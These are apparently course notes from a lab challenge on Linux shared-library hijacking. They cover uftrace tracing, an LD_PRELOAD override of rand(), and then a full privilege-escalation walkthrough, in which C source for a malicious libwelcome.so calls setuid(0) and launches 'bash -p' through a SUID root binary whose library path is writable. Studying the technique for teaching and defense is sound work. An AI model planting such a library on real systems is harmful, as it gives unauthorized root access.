**Shared libraries** are files that contain functions and resources used by multiple programs. When a program requires a function from a shared library, the operating system searches for the library and dynamically links the required function during program execution. However, if the system does not find the library in the default paths, it may search for it in other directories.

An attacker can exploit this situation by creating a **malicious shared library** with the same name as the legitimate library and placing it in a directory where the system will search for it. When the program attempts to load the library, the system will load the malicious version instead of the legitimate one, allowing the attacker to execute malicious code with the privileges of the victim program.

In this class, we will analyze how the hijacking of dynamically linked shared object libraries is carried out and how to identify situations where this technique can be applied.

Below is one of the tools we use in this class to analyze the execution of a program written in C/C++:

- **Uftrace Tool**: [https://github.com/namhyung/uftrace](https://github.com/namhyung/uftrace)

Additionally, here is the direct link to the **AttackDefense** platform, where we will be solving a challenge involving this same topic:

- **AttackDefense**: [https://attackdefense.com](https://attackdefense.com/)

Imagine we have a binary `random` that simply generates a random number each time it is executed.
![[Pasted image 20260218183134.png]]
![[Pasted image 20260218183155.png]]

If we analyze what it does behind the scenes using `uftrace` (or `ltrace`), we see that it is calling a system function named `rand()`.
![[Pasted image 20260218183311.png]]

So we will download a tool from git called [uftrace](https://github.com/namhyung/uftrace), which will give us real-time information about what the program does and the resources it uses.
![[Pasted image 20260218183520.png]]
![[Pasted image 20260218183547.png]]

Now we will play with two parameters: `--force` and `-a` (which shows the arguments and returns the value of known functions).
![[Pasted image 20260218183734.png]]
Here we already see more details: a call to the `time`, `srand`, and `rand` functions. We will try to hijack the `rand` function, which we assume is responsible for randomizing the number, so that it always returns the same value.

For the program to execute our `rand` instead of the real `rand`, our "fake" `rand` must match the signature of the original `rand`. Typically, a function signature includes: Name - Arguments - Return type.

So something we could try is a **man 3 rand** to search the manual in section 3, which covers the functions of the C library.
![[Pasted image 20260218184627.png]]
Here's the trick: with the `LD_PRELOAD` environment variable, we can tell the system: "Hey, before loading the normal libraries, load **MINE** first."

So we create a C script (`test.c`) to hijack the `rand()` function and make it always return, for example, 42.
```c
#include <stdio.h>

// Define the same function as the original
int rand(void){
    return 42; // Our fake value
}
```
We compile it as a shared library (`.so`): `gcc -shared -fPIC test.c -o test.so`

And now, if we run it forcing the load with `LD_PRELOAD`, we see that we have "broken" the randomness and it always returns our number. We have hijacked the function.
![[Pasted image 20260218191743.png]]

Now let's get serious. We have a binary `/usr/bin/welcome`. If we run `ls -l`, we see that **SUID** is active and the owner is **root**. This smells like if we exploit it, we become root.
![[Pasted image 20260218191827.png]]
The problem is that if we try to execute it, it gives us an error saying it cannot find a library called `libwelcome.so`.
![[Pasted image 20260218191845.png]]
If we run `ldd /usr/bin/welcome`, it confirms that `libwelcome.so => not found`.
![[Pasted image 20260218191900.png]]
Let's see where it is trying to search for this library. We check the library configuration in `/etc/ld.so.conf.d/`.
![[Pasted image 20260218192016.png]]
Also, if we had write permissions in this directory, we could specify a custom path for the library.

We see a file `custom.conf` that points to a strange path: `/home/student/lib`.
![[Pasted image 20260218192030.png]]

**Here's the vulnerability:** If we run `ls` in `/home/student`, we see that the `lib` directory **DOES NOT EXIST**. But since we are in our home directory, **we have permissions to create it**.
![[Pasted image 20260218192254.png]]
So the plan is:

1. Create the directory.
    
2. Create a malicious library named `libwelcome.so`.
    
3. When executing the SUID binary, it will load our library and execute our code as root.
    

- **Create the directory:** `mkdir /home/student/lib`
    
- **Prepare your exploit in C:** Since the binary was looking for the symbol "welcome" (as hinted by the earlier error), we create a function with that name that launches a `bash` as root.
    
    ```c
    
    ```
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    int welcome(){
        setuid(0); // Nos convertimos en Root
        setgid(0);
        system("bash -p"); // Lanzamos la shell preservando privilegios
        return 0;
    }
    ```
    
- **We compile the malicious library:** `gcc -fPIC -shared test.c -o libwelcome.so`
    
- **We move it to where the binary looks for it:** `mv libwelcome.so /home/student/lib/`
![[Pasted image 20260218192337.png]]

